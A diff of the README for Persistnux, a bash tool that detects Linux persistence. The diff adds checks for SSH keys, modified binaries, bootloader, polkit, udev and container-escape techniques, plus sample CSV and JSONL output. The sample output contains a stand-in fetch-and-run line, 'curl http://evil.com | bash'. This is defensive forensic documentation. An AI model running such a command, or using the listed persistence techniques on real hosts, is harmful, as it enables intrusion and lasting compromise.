@@ -33,6 +33,7 @@ Persistnux is a bash-based tool designed to identify known Linux persistence mec
 - User crontabs for all users (root mode)
 - At jobs
 - Suspicious command patterns in scheduled tasks
+- `/etc/cron.allow` and `/etc/cron.deny` ACL files — entries referencing nonexistent users flagged
 
 ### 3. Shell Profiles & RC Files
 - System-wide profiles (`/etc/profile`, `/etc/bash.bashrc`, `/etc/zshrc`)
@@ -71,6 +72,52 @@ Persistnux is a bash-based tool designed to identify known Linux persistence mec
 - Git credential helpers and core.pager settings — content analysis for all users
 - Web shells in common web directories
 
+### 8. SSH Persistence
+- Per-user `~/.ssh/authorized_keys` — recently modified keys flagged; `command=` option content analyzed for suspicious patterns
+- Per-user `~/.ssh/rc` — presence flagged MEDIUM; suspicious/reverse shell content → HIGH/CRITICAL
+
+### 9. Binary Hijacking
+- Verifies installed system binaries against the package database (`dpkg -V` on Debian/Ubuntu, `rpm -Va` on RHEL/CentOS)
+- Modified files in `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin` → CRITICAL finding
+- Modified PAM modules in `/lib/security` → CRITICAL finding
+- Conffiles (dpkg configuration files) are excluded to avoid false positives
+
+### 10. Bootloader & Initramfs
+- GRUB `init=` kernel parameter injection (`/etc/default/grub`, `/etc/default/grub.d/*.cfg`)
+- Root-level dropped init scripts at `/`
+- Dracut initramfs modules with `pre-pivot` hooks writing to `/sysroot/etc/shadow`
+- Ubuntu initramfs-tools hook scripts in `/etc/initramfs-tools/scripts/` and `/hooks/`
+- Recently modified `/boot/initrd.img-*` images (mtime-based)
+
+### 11. Polkit (PolicyKit) Manipulation
+- `.pkla` files with unconditional `ResultAny/ResultInactive/ResultActive=yes`
+- Wildcard identity (`unix-user:*`) grants
+- `.rules` files with unconditional `polkit.Result.YES` (JavaScript-based Polkit >= 0.106)
+
+### 12. D-Bus & NetworkManager
+- Malicious D-Bus system service `Exec=` registration (`/usr/share/dbus-1/system-services/`)
+- D-Bus policy wildcard `allow own="*"` or `send_destination="*"` directives
+- NetworkManager dispatcher scripts (`/etc/NetworkManager/dispatcher.d/`)
+
+### 13. Udev Rules
+- Udev `RUN+=` directives executing arbitrary commands or scripts (`/etc/udev/rules.d/`, `/lib/udev/rules.d/`)
+- Runtime-injected rules in `/run/udev/rules.d/`
+- `at`/`cron` delegation patterns in `RUN+=` (common foreground restriction bypass)
+
+### 14. Container Escape
+- Privileged Docker containers (`--privileged`, `--pid=host`)
+- `docker.sock` bind-mounts into containers (full host control via Docker API)
+- `nsenter -t 1` in container entrypoints or Dockerfiles
+- Dockerfiles in user-writable directories containing escape techniques
+
+### 15. Advanced Binary & Privilege Checks
+- Active SUID/SGID filesystem scan across system directories
+- File capability scan via `getcap` — `cap_setuid+ep` on GTFOBins → CRITICAL
+- Binary hijacking: renamed originals (`.original`, `.old`, `.bak`, `.real`) with wrapper scripts
+- Non-root accounts with UID 0 in `/etc/passwd`
+- Shell masking via trailing space in `/etc/passwd` shell field
+- System accounts (UID 1-999) with SSH `authorized_keys` files
+
 ## Installation
 
 ```bash
@@ -97,7 +144,7 @@ sudo ./persistnux.sh
 ./persistnux.sh
 ```
 
-### Filtering Options (v2.2+)
+### Filtering Options (v2.4+)
 
 By default, Persistnux shows only **suspicious findings** (MEDIUM, HIGH, CRITICAL confidence) to reduce noise and focus on actionable threats.
 
@@ -133,14 +180,15 @@ By default, Persistnux creates an output directory `./persistnux_output/` contai
 
 - `persistnux_<hostname>_<timestamp>.csv` - CSV format report
 - `persistnux_<hostname>_<timestamp>.jsonl` - JSONL format report (one JSON object per line)
+- `persistnux_<hostname>_<timestamp>_report.txt` - Human-readable summary report with findings counts and scan metadata
 
 ## Output Format
 
 ### CSV Format
 
 ```csv
-timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permissions,file_age_days,package_status,command,enabled_status,description,matched_pattern,matched_string
-2026-01-23T10:30:00Z,webserver01,Systemd Service,HIGH,/etc/systemd/system/example.service,abc123...,root:root,644,3,unmanaged,/usr/bin/example,enabled,example.service,suspicious_script_content,"curl http://evil.com | bash"
+timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permissions,file_age_days,package_status,command,description,matched_pattern,matched_string
+2026-01-23T10:30:00Z,webserver01,Systemd Service,HIGH,/etc/systemd/system/example.service,abc123...,root:root,644,3,unmanaged,example.service,suspicious_script_content,"curl http://evil.com | bash"
 ```
 
 ### JSONL Format
@@ -157,8 +205,7 @@ timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permi
   "file_permissions": "644",
   "file_age_days": "3",
   "package_status": "unmanaged",
-  "command": "/usr/bin/example",
-  "enabled_status": "enabled",
+  "command": "/opt/example.sh",
   "description": "example.service",
   "matched_pattern": "suspicious_script_content",
   "matched_string": "curl http://evil.com | bash"
@@ -220,6 +267,20 @@ Persistnux automatically flags items with higher confidence when it detects:
 - Optional: `systemctl`, `lsmod`, `modinfo` (for specific checks)
 - Root/sudo access recommended for comprehensive analysis
 
+## Tested On / Compatibility
+
+| Distribution | Status | Notes |
+|---|---|---|
+| Ubuntu 22.04 LTS | ✅ Tested | Primary development and test platform |
+| Ubuntu 20.04 LTS | ✅ Tested | Fully supported |
+| Debian 11/12 | ✅ Tested | dpkg-based, same path conventions |
+| RedHat / RHEL | ⚠️ Not yet tested | rpm support is implemented but unverified on live systems |
+| Fedora | ⚠️ Not yet tested | rpm support is implemented but unverified on live systems |
+| CentOS / AlmaLinux / Rocky | ⚠️ Not yet tested | rpm support is implemented but unverified on live systems |
+| Arch Linux | 🔬 Experimental | pacman support implemented |
+
+> **Note:** The tool is primarily tested on **Ubuntu/Debian** systems. RedHat, Fedora, and RPM-based distributions have package manager support implemented in code but have not been validated in live test environments. Contributions and test reports for RPM-based distros are welcome.
+
 ## DFIR Workflow Integration
 
 ### Example: Import into Splunk
@@ -261,7 +322,6 @@ df.groupby('category').size()
 
 - [ ] Offline analysis mode for forensic disk images
 - [ ] UAC (Unix-like Artifacts Collector) integration
-- [ ] Extended detection for containerized environments (Docker, Podman)
 - [ ] YARA rule integration for binary analysis
 - [ ] Timeline generation
 - [ ] HTML report generation
